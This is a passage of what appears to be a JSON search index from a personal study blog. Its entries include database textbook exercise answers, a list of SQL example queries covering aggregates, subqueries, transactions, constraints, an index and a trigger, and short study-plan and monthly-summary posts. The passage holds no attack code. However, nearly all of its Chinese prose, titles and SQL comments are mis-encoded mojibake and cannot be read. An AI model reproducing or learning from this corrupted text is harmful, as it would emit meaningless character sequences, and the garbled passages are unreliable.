ï¼šæŸä¸ªå¯ä»¥å”¯ä¸€ç¡®å®šä¸€ä¸ªå…ƒç»„çš„å±æ€§ç»„ï¼Œå¦‚å­¦ç”Ÿçš„å­¦å·\nåŸŸï¼šä¸€ç»„å…·æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„å€¼çš„é›†åˆï¼Œå¦‚æ€§åˆ«çš„åŸŸæ˜¯{ç”·ï¼Œå¥³}ï¼Œå¤§å­¦ç”Ÿå¥ˆå¹´é¾„å±æ€§çš„åŸŸæ˜¯ï¼ˆ15ï¼Œ45ï¼‰\nåˆ†é‡ï¼šå…ƒç»„ä¸­çš„ä¸€ä¸ªå±æ€§å€¼\n14.è¯•è¿°å…³ç³»æ•°æ®åº“çš„ç‰¹ç‚¹\nè§„èŒƒåŒ–ï¼Œå³å…³ç³»çš„æ¯ä¸€ä¸ªåˆ†é‡å¿…é¡»æ˜¯ä¸€ä¸ªä¸å¯åˆ†çš„æ•°æ®é¡¹\nå…³ç³»æ¨¡å‹ä¸æ ¼å¼åŒ–æ¨¡å‹ä¸åŒï¼Œå»ºç«‹åœ¨ä¸¥æ ¼çš„æ•°å­¦æ¦‚å¿µçš„åŸºç¡€ä¸Š\næ¦‚å¿µå•ä¸€ï¼Œå®ä½“é—´çš„è”ç³»ï¼Œå¯¹æ•°æ®çš„æ£€ç´¢å’Œæ›´æ–°ä¹Ÿæ˜¯å…³ç³»ï¼ˆTableï¼‰ï¼Œæ•°æ®ç»“æ„ç®€å•æ¸…æ™°\nå­˜å–è·¯å¾„é€æ˜ï¼Œæ›´é«˜çš„æ•°æ®ç‹¬ç«‹æ€§ï¼Œæ›´å¥½çš„å®‰å…¨ä¿å¯†æ€§ï¼Œç®€åŒ–ç¨‹åºå‘˜çš„å·¥ä½œï¼Œä½†æŸ¥è¯¢æ•ˆç‡è¾ƒä½\n** åœ¨è®¡ç®—æœºä¸­ï¼Œä»æŸä¸ªè§’åº¦*çœ‹ä¸åˆ°çš„ç‰¹æ€§ç§°è¯¥ç‰¹æ€§æ˜¯é€æ˜çš„*ã€‚è¿™ä¸ªæ„ä¹‰ä¸Šçš„â€œé€æ˜â€ä¸ç¤¾ä¼šç”Ÿæ´»ä¸­çš„é€æ˜å«ä¹‰*æ°å¥½ç›¸å*ï¼Œä¾‹å¦‚è®¡ç®—æœºç»„ç»‡å¯¹ç¨‹åºå‘˜æ˜¯é€æ˜çš„ï¼Œå°±æ˜¯è¯´è®¡ç®—æœºç»„ç»‡å¯¹ç¨‹åºå‘˜æ¥è¯´æ˜¯çœ‹ä¸åˆ°çš„ï¼Œä¹Ÿä¸éœ€è¦çœ‹åˆ°çš„ã€‚*å’Œæ±‰è¯­å­—å…¸é‡Œé¢çš„æ„æ€ä¸ä¸€æ ·ã€‚ ***\n15ï¼Œè¯•è¿°æ•°æ®åº“ç³»ç»Ÿçš„ä¸‰çº§æ¨¡å¼ç»“æ„ï¼Œå¹¶è¯´æ˜ä¼˜ç‚¹\nå¤–æ¨¡å¼ï¼Œæ¨¡å¼ï¼Œå†…æ¨¡å¼\nå¤–æ¨¡å¼ï¼šå­æ¨¡å¼æˆ–ç”¨æˆ·æ¨¡å¼ï¼Œæ•°æ®åº“ç”¨æˆ·èƒ½å¤Ÿçœ‹è§å’Œä½¿ç”¨çš„å±€éƒ¨æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°ï¼Œæ˜¯æ•°æ®åº“ç”¨æˆ·çš„æ•°æ®è§†å›¾ï¼Œæ˜¯ä¸æŸä¸€åº”ç”¨æœ‰å…³çš„æ•°æ®çš„é€»è¾‘è¡¨ç¤º\nå†…æ¨¡å¼ï¼šå­˜å‚¨æ¨¡å¼ï¼Œæ•°æ®ç‰©ç†ç»“æ„å’Œå­˜å‚¨æ–¹å¼çš„æè¿°ï¼Œæ˜¯æ•°æ®åœ¨æ•°æ®åº“å†…éƒ¨çš„ç»„ç»‡æ–¹å¼\næ¨¡å¼ï¼šé€»è¾‘æ¨¡å¼ï¼Œæ˜¯æ•°æ®åº“ä¸­å…¨ä½“æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°ï¼Œæ˜¯æ‰€æœ‰ç”¨æˆ·çš„å…¬å…±æ•°æ®è§†å›¾ï¼Œä¸€ä¸ªæ•°æ®åº“åªæœ‰ä¸€ä¸ªæ¨¡å¼\nä½¿ç”¨æˆ·èƒ½å¤Ÿé€»è¾‘çš„ï¼ŒæŠ½è±¡çš„å¤„ç†æ•°æ®ï¼Œè€Œä¸å¿…å…³å¿ƒæ•°æ®åœ¨è®¡ç®—æœºä¸­çš„å…·ä½“è¡¨ç¤ºæ–¹å¼ä¸å­˜å‚¨æ–¹å¼\n17.ä»€ä¹ˆå«æ•°æ®ä¸ç¨‹åºçš„ç‰©ç†ç‹¬ç«‹æ€§ï¼Ÿæ•°æ®ä¸ç¨‹åºçš„é€»è¾‘ç‹¬ç«‹æ€§ï¼Ÿä¸ºä»€ä¹ˆæ•°æ®åº“ç”±æ•°æ®ä¸ç¨‹åºçš„ç‹¬ç«‹æ€§ï¼Ÿ\nç‰©ç†ç‹¬ç«‹æ€§ï¼šå½“æ•°æ®åº“çš„å­˜å‚¨ç»“æ„æ”¹å˜æ—¶ï¼Œç”±æ•°æ®åº“ç®¡ç†å‘˜å¯¹æ¨¡å¼/å†…æ¨¡å¼æ˜ åƒä½œå“åº”æ”¹å˜\né€»è¾‘ç‹¬ç«‹æ€§ï¼šå½“æ¨¡å¼æ”¹å˜æ—¶ï¼Œç”±æ•°æ®åº“ç®¡ç†å‘˜å¯¹å„ä¸ªå¤–æ¨¡å¼/æ¨¡å¼çš„å½±å“ä½œç›¸åº”æ”¹å˜ï¼Œå¯ä»¥ä½¿å¤–æ¨¡å¼ä¿æŒä¸å˜ã€‚åº”ç”¨ç¨‹åºæ˜¯ä¾æ®æ•°æ®çš„å¤–æ¨¡å¼ç¼–å†™ï¼Œä»è€Œåº”ç”¨ç¨‹åºä¸å¿…ä¿®æ”¹ï¼Œä¿è¯äº†æ•°æ®ä¸ç¨‹åºçš„é€»è¾‘ç‹¬ç«‹æ€§ï¼Œç®€ç§°æ•°æ®çš„é€»è¾‘ç‹¬ç«‹æ€§ã€‚\næ•°æ®ä¸ç¨‹åºä¹‹é—´çš„ç‹¬ç«‹æ€§ä½¿å¾—æ•°æ®çš„å®šä¹‰å’Œæè¿°å¯ä»¥ä»åº”ç”¨ç¨‹åºä¸­åˆ†ç¦»å‡ºå»ã€‚ç”±äºæ•°æ®çš„å­˜å‚¨ç”±æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç®¡ç†ï¼Œä»è€Œç®€åŒ–äº†åº”ç”¨ç¨‹åºçš„ç¼–åˆ¶ï¼Œå¤§å¤§å‡å°‘äº†åº”ç”¨ç¨‹åºçš„ç»´æŠ¤å’Œä¿®æ”¹ã€‚\n18.è¯•è¿°æ•°æ®åº“ç³»ç»Ÿçš„ç»„æˆ\næ•°æ®åº“ï¼Œæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œåº”ç”¨ç¨‹åºå’Œæ•°æ®åº“ç®¡ç†å‘˜\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"æ•°æ®åº“ç³»ç»Ÿæ¦‚è®ºç¬¬ä¸€ç« ä¹ é¢˜ç­”æ¡ˆ"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 SELECT RTRIM(vend_name) + \u0026#39;(\u0026#39;+ --å³è¾¹å–æ¶ˆç©ºæ ¼ RTRIM(vend_country) + \u0026#39;)\u0026#39; AS vend_title From Vendors ORDER BY vend_name; SELECT prod_id,quantity,item_price,quantity*item_price AS expanded_price FROM OrderItems; SELECT vend_name,UPPER(vend_name) --å¤§å†™ AS vend_name_upcase FROM Vendors ORDER BY vend_name; SELECT cust_name,cust_contact FROM Customers WHERE SOUNDEX(cust_contact) = SOUNDEX(\u0026#39;Michael Green\u0026#39;); --è¿‘ä¼¼å‘éŸ³ SELECT order_num FROM Orders WHERE DATEPART(yy,order_date) = 2020; SELECT AVG(prod_price) AS avg_price --å–å¹³å‡å€¼ FROM Products WHERE vend_id = \u0026#39;DLL01\u0026#39;; SELECT COUNT(*)AS num_cust --å¯¹æ‰€æœ‰è¡Œè®¡æ•° FROM Customers; SELECT MAX(prod_price) AS max_price FROM Products; SELECT SUM(quantity*item_price) AS items_ordered FROM OrderItems WHERE order_num = 20005; SELECT AVG(DISTINCT prod_price) AS avg_price FROM Products Where vend_id =\u0026#39;DLL01\u0026#39;; SELECT COUNT(*) AS num_items,MIN(prod_price) AS price_min,MAX(prod_price) AS proce_max,AVG(prod_price) AS price_avg --ç»„åˆèšé›†å‡½æ•° FROM products; SELECT vend_id,COUNT(*) AS num_prods FROM Products Group BY vend_id HAVING COUNT(*) \u0026gt;= 2;--è¿‡æ»¤åˆ†ç»„ï¼Œgroup by å’Œ havingç»“åˆ SELECT order_num,COUNT(*)AS items FROM OrderItems Group BY order_num HAVING COUNT(*) \u0026gt;= 3--æ£€ç´¢åŒ…å«ä¸‰ä¸ªæˆ–æ›´å¤šç‰©å“çš„è®¢å•å·å’Œè®¢è´­ç‰©å“çš„æ•°ç›® ORDER BY items,order_num;--æŒ‰è®¢è´­ç‰©å“çš„æ•°ç›®æ’åºè¾“å‡ºï¼Œhavingåœ¨group byå‰ï¼Œorder byå SELECT cust_id FROM OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;; SELECT cust_id FROM Orders WHERE order_num IN (20007,20008); SELECT cust_id FROM Orders WHERE order_num IN (SELECT cust_id FROM Orders WHERE order_num IN (20007,20008));--å»ºç«‹ä»¥ä¸Šçš„å­æŸ¥è¯¢ï¼Œç”±å†…å‘å¤– SELECT cust_name,cust_state,(SELECT COUNT(*)FROM Orders WHERE Orders.cust_id=Customers.cust_id) AS orders --å­æŸ¥è¯¢å¯¹æ£€ç´¢å‡ºçš„æ¯ä¸ªé¡¾å®¢æ‰§è¡Œä¸€æ¬¡ï¼Œç”¨å¥ç‚¹é¿å…æ··æ·†åˆ—å FROM Customers ORDER BY cust_name;--å¯¹äºæ£€ç´¢å‡ºçš„æ¯ä¸ªé¡¾å®¢ï¼Œç»Ÿè®¡å…¶åœ¨Ordersè¡¨ä¸­çš„è®¢å•æ•°ç›® SELECT vend_name,prod_name,prod_price FROM Vendors,Products WHERE Vendors.vend_id = Products.vend_id; BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--ä½¿ç”¨ä¿ç•™ç‚¹delete1ï¼Œä¿ç•™ç‚¹è¶Šå¤šè¶Šå¥½ï¼Œé¢èƒ½è¿›è¡Œçµæ´»çš„å›é€€ DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--å›é€€åˆ°ä¿ç•™ç‚¹delete1 COMMIT TRANSACTION--æ§åˆ¶äº‹ç‰©å¤„ç†ï¼Œæœ€åçš„commitä»…åœ¨ä¸­é—´è¿‡ç¨‹ä¸å‡ºé”™çš„æƒ…å†µä¸‹å†™å‡ºæ›´æ”¹ BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--ä½¿ç”¨ä¿ç•™ç‚¹delete1ï¼Œä¿ç•™ç‚¹è¶Šå¤šè¶Šå¥½ï¼Œé¢èƒ½è¿›è¡Œçµæ´»çš„å›é€€ DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--å›é€€åˆ°ä¿ç•™ç‚¹delete1 COMMIT TRANSACTION--æ§åˆ¶äº‹ç‰©å¤„ç†ï¼Œæœ€åçš„commitä»…åœ¨ä¸­é—´è¿‡ç¨‹ä¸å‡ºé”™çš„æƒ…å†µä¸‹å†™å‡ºæ›´æ”¹ DECLARE CURSOR CustCursor IS SELECT * FROM Customers WHERE cust_email IS NULL; ALTER TABLE Vendors ADD CONSTRAINT PRIMARY KEY(vend_id)--è®¾ç½®ä¸»é”®ï¼ŒDBMSé»˜è®¤ä¸»é”®åŸºæœ¬ä¸ä¿®æ”¹æˆ–æ›´æ–°ï¼Œä¸èƒ½é‡ç”¨ ALTER TABLE Orders ADD CONSTRAINT FOREIGN KEY (cust_id) REFERENCES Customers(cust_id);--å°†æ­¤è¡¨ä¸­çš„cust_idè®¾ç½®ä¸ºCustomersçš„ä¸»é”®ï¼Œå³å¤–é”®ã€‚å¤–é”®æœ‰åŠ©é˜²æ­¢æ„å¤–åˆ é™¤ï¼Œè‹¥åˆ é™¤ï¼Œçº§è”åˆ é™¤ CREATE INDEX prod_name_ind--ç´¢å¼•å ON Products(prod_name)--è¢«ç´¢å¼•çš„è¡¨ï¼Œåˆ— CREATE TRIGGER customer_state ON Customers FOR INSERT,UPDATE AS UPDATE Customers SET cust_state=Upper(cust_state) WHERE Customers.cust_id = inserted.cust_id;--åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œå¯¹æ‰€æœ‰INSERTå’ŒUPDATEæ“ä½œï¼Œå°†cust_stateè½¬ä¸ºå¤§å†™ ","date":"2024-12-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A%E4%BE%8B%E5%AD%90/","title":"SQLå¿…çŸ¥å¿…ä¼šä¾‹å­"},{"content":"Python çˆ¬è™« å»ºæ¨¡ æ•°æ®æŒ–æ˜ï¼ˆç»Ÿè®¡æ–¹å‘çš„å¾…å®šï¼‰ JS åšä¸ªä»£åŠäº‹é¡¹åˆ—è¡¨ï¼ˆæˆ‘æ‰€èƒ½æƒ³åˆ°JSå¯¹æˆ‘çš„å”¯ä¸€ç”¨å¤„å°±æ˜¯ç½‘é¡µåŠ ä¸ªå“åº”ä»€ä¹ˆçš„ï¼‰\né‡æ–°å·©å›ºCè¯­è¨€ Unity å­¦ä¹ C#è¯­è¨€ï¼Œå¯èƒ½å¤§åˆ›å†™ä¸ªæ¸¸æˆï¼Œæˆ–è€…è·Ÿä¹‹å‰è”ç³»å¥½çš„è®¾è®¡ç³»æœ‹å‹å†™ç€ç©ç©\nLeetcode åˆ·é¢˜å‘¨èµ› ç®—æ³•ä¸æ•°æ®ç»“æ„ ç®—æ˜¯æå‰é¢„ä¹ å¤§ä¸‰å†…å®¹ï¼Œä»¥åŠä½“éªŒä¸‹æœ‹å‹æ‰€è¯´çš„ç®—æ³•addiction\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/plan-after-this-semester/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202170215_hu_f5523af80b8f11a1.jpg","permalink":"https://Frederick2313072.github.io/p/plan-after-this-semester/","title":"Plan after this semester"},{"content":"Python åŸºç¡€è¯­æ³•åˆ°é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œå°é¡¹ç›®åªç”¨è¿‡pygameå†™äº†ä¸€ä¸ªçª—å£å°„å‡»æ¸¸æˆï¼Œå›¾çµç³»åˆ—é‚£æœ¬pythonç¼–ç¨‹å­¦çš„å¾ˆæµç•…ï¼Œå¾ˆå¿«èƒ½ä¸Šæ‰‹é¡¹ç›®\nJavascript åˆ°ç°åœ¨åªå­¦äº†ç‚¹çš®æ¯›ï¼Œåªä¼šåšåŠ¨æ€å†…å®¹æ›´æ–°ï¼Œä¹Ÿåªæ˜¯è‡ªå·±åšhtmlç½‘é¡µæ—¶ä¹±åŠ ä¸Šå»çš„\nLinux ä¸€å¼€å§‹ç”šè‡³æ‰“ç®—ä¹°ä¸ªç”µè„‘é‡è£…Linuxï¼Œçœ‹åˆ°æ— æ•°äººå› ä¸ºLinuxæ•´ä¸ªå¤§å­¦æ²¡æ•²å‡ è¡Œä»£ç è¢«åŠé€€äº†ï¼Œæœ€ååªå­¦äº†Bashï¼Œä½†æ˜¯å’Œwindowsçš„shellä¸å…¼å®¹ï¼Œç”¨çš„ä¹Œç­å›¾ç‰ˆæœ¬ï¼Œä»¥ä¸‹æ˜¯æˆ‘è¯•è¿‡çš„æ‰€æœ‰åŠæ³•ï¼š\nè™šæ‹Ÿç›˜å¼€æœºå’ŒWindowsåŒç³»ç»Ÿ è™šæ‹Ÿæœºå¦‚virtualboxå’ŒVmwareï¼ˆæ®è¯´å¯ä»¥ç”³è¯·é˜¿é‡Œäº‘å­¦ç”ŸæœåŠ¡å™¨ï¼Œä½†æˆ‘ç”¨çš„å‰è€…ï¼‰ Windowsè‡ªå¸¦wslï¼Œæœ€åè‡ªå·±æäº†ä¸ªå›¾å½¢åŒ–ç•Œé¢ï¼Œç”šè‡³ç°åœ¨å¶å°”è¿˜åœ¨ç”¨ å·¥å…· Vimï¼šå¾ˆå®¹æ˜“ä¸Šæ‰‹ï¼Œä½†ä¸å¸¸ç”¨å°±ä¼šå¾ˆå¿«å¿˜äº†ï¼ˆè°æ²¡äº‹ä¼šåœ¨shellé‡Œé¢ç¼–è¾‘æ–‡æœ¬ï¼‰ Nanoï¼šå¯è¯»æ€§æ¯”Vimå¼ºï¼Œä½†æˆ‘å·²ç»ä¹ æƒ¯Vimäº† SSH Docker Gitï¼šæœ€é‡è¦çš„ä¸€ä¸ªï¼Œä¸ç”¨å¤šè¯´ æ•°æ®åº“ å­¦æ ¡è¯¾ç¨‹ï¼Œä½†åè€Œå¾ˆä¸ä¸Šå¿ƒï¼Œæ˜å¤©å¼€å§‹é‡å­¦\nCSå¸¸è¯† bç«™æœ‰ä¸ªåšçš„å¾ˆå¥½çš„ç§‘æ™®è§†é¢‘ï¼Œä¼šæ”¾åœ¨Resourceé‡Œé¢\nHtml ä¸¥æ ¼æ¥è¯´ï¼Œå¤ªç®€å•ç®—ä¸ä¸Šç¼–ç¨‹è¯­è¨€\nCSS ä¹‹å‰è‡ªå·±åšäº†ä¸ªCSSæ¨¡æ¿ï¼Œç»“æœåœ¨è¿è¡Œcmdæ—¶è¢«tailwindè¦†ç›–å®Œäº†ï¼Œæ²¡æœ‰gitåˆ°è¿œç¨‹ä»“åº“\u0026hellip;\u0026hellip;\næ•°å­¦åˆ†æ3ï¼Œæ¦‚ç‡è®º å‰è€…å¤ªéš¾å¬ä¸æ‡‚ï¼Œåè€…å¤ªç®€å•ä¸æƒ³å¬\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/summary-in-november/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202225640_hu_95a0bebc19439f13.jpg","permalink":"https://Frederick2313072.github.io/p/summary-in-november/","title":"Summary in November"},{"content":"ç¬¬ä¸‰ç«  SQL 1.è¯•è¿°SQLçš„ç‰¹ç‚¹\nç»¼åˆç»Ÿä¸€ï¼Œé«˜åº¦éè¿‡ç¨‹åŒ–ï¼Œé¢å‘é›†åˆçš„æ“ä½œæ–¹å¼ï¼Œä»¥åŒä¸€ç§è¯­æ³•ç»“æ„æä¾›å¤šç§ä½¿ç”¨æ–¹å¼\n2.è¯´æ˜åœ¨DROP TABLEæ—¶ï¼ŒRESTRICTå’ŒCASCADEçš„åŒºåˆ«\n","date":"0001-01-01T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/","title":""}]